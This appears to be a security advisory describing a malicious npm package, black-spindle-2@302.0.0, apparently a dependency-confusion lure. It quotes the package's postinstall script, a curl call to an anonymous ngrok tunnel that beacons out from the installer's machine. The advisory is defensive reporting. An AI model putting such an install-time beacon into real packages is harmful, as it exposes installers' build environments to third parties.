summary: postinstall beacon to anonymous ngrok tunnel on install
details: black-spindle-2@302.0.0 ships an empty library (index.js is `module.exports = {};`) and a package.json whose postinstall lifecycle script runs `curl http://778e-181-63-25-28.ngrok-free.app/simpletest`. Installing the package fires an unauthenticated plaintext HTTP call to an anonymous, mutable ngrok tunnel controlled by a third party, disclosing the installer's IP, timing, and the fact that the package reached an internal build environment. The implausibly high version number (302.0.0) and the stub body are consistent with a dependency-confusion lure whose only purpose is the install-time beacon.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
